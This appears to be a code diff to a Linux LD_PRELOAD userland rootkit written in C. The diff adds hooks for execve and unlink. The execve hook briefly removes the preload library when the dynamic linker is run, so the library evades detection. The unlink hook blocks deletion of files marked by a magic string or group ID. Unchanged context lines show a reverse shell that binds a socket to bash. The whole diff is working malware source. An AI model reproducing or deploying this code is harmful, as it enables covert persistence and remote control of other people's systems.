@@ -19,10 +19,12 @@ static struct dirent* (*old_readdir)(DIR *dir) = NULL;
 static struct dirent64* (*old_readdir64)(DIR *dir) = NULL;
 static FILE* (*old_fopen)(const char *path, const char *mode) = NULL;
 static FILE* (*old_fopen64)(const char *path, const char *mode) = NULL;
+static int (*old_execve)(const char *path, char *const argv[], char *const envp[]) = NULL;
 static int (*old_access)(const char *path, int mode) = NULL;
 static int (*old_open)(const char *path, int flags, mode_t mode) = NULL;
 static int (*old_openat)(int fd, const char *pathname, int flags, mode_t mode) = NULL;
 static int (*old_rmdir)(const char *path) = NULL;
+static int (*old_unlink)(const char *path) = NULL;
 static int (*old_unlinkat)(int fd, const char *path, int flags) = NULL;
 static int (*old_fxstat)(int ver, int fd, struct stat *buf) = NULL;
 static int (*old_fxstat64)(int ver, int fd, struct stat64 *buf) = NULL;
@@ -53,7 +55,9 @@ void IPv4() {
         if (bind(sockfd, (struct sockaddr *)&client, sizeof(client)) == -1) exit(0x0);
         if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) exit(0x0);
         for(int i = 0; i < 3; i++) dup2(sockfd, i);
-        execve("/bin/bash", NULL, NULL);
+        if(old_execve == NULL) old_execve = dlsym(RTLD_NEXT, "execve");
+
+        old_execve("/bin/bash", NULL, NULL);
         close(sockfd);
         exit(0x0);
     }
@@ -154,6 +158,23 @@ FILE* fopen64(const char *path, const char *mode) {
 }
 
 
+int execve(const char *path, char *const argv[], char *const envp[]) {
+    if(old_execve == NULL) old_execve = dlsym(RTLD_NEXT, "execve");
+
+    printf("%s\n", path);
+    if(strstr(path, LD_LIBRARY) != NULL) {
+        if(old_unlink == NULL) old_unlink = dlsym(RTLD_NEXT, "unlink");
+        
+        old_unlink(PRELOAD_PATH);
+        old_execve(path, argv, envp);
+        link(PRELOAD_PATH, PRELOAD_PATH);
+
+        return 0;
+    }
+    return old_execve(path, argv, envp);
+}
+
+
 int access(const char *path, int mode) {
     if(old_access == NULL) old_access = dlsym(RTLD_NEXT, "access");
     if(strcmp(path, PRELOAD_PATH) == 0 || strstr(path, MAGIC_STRING) != NULL) {
@@ -242,6 +263,33 @@ int rmdir(const char *path) {
         return -1;
     }
     return old_rmdir(path);
+}
+
+
+int unlink(const char *path) {
+    if(old_unlink == NULL) old_unlink = dlsym(RTLD_NEXT, "unlink");
+
+    #if __x86_64__
+    struct stat64 tmp_stat;
+
+    if(old_xstat64 == NULL) old_xstat64 = dlsym(RTLD_NEXT, "__xstat64");
+    memset(&tmp_stat, 0, sizeof(stat64));
+    old_xstat64(3, path, &tmp_stat);
+    #else
+    struct stat tmp_stat;
+
+    if(old_xstat == NULL) old_xstat = dlsym(RTLD_NEXT, "__xstat");
+    memset(&tmp_stat, 0, sizeof(stat));
+    old_xstat(3, path, &tmp_stat);
+    #endif
+
+    if(strstr(path, MAGIC_STRING) != NULL
+    || strcmp(path, PRELOAD_PATH) == 0
+    || tmp_stat.st_gid == MAGIC_GID) {
+        errno = ENOENT;
+        return -1;
+    }
+    return old_unlink(path);
 }
 
 
